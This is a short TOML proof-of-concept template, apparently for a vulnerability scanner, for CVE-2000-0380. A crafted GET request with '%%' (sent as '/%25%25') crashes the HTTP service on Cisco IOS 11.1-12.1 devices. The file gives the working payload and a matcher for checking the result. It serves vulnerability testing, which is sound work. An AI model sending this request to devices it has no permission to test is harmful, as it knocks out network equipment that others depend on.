[info]
author = "ave"
description = "向 Cisco IOS 11.1-12.1 设备的 HTTP 服务发送包含 %% 的特制 GET 请求，触发服务崩溃导致拒绝服务。验证方式：发送请求后检查目标 HTTP 服务是否仍可连接。"
id = "POC-AVE-2000-0315"
name = "Cisco IOS HTTP %% 拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-2000-0315"]
vuln_id = [
    "CVE-2000-0380",
    "AVE-2000-0315",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%25%25"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "HTTP/1.0 200 OK",
    "HTTP/1.1 200 OK",
]
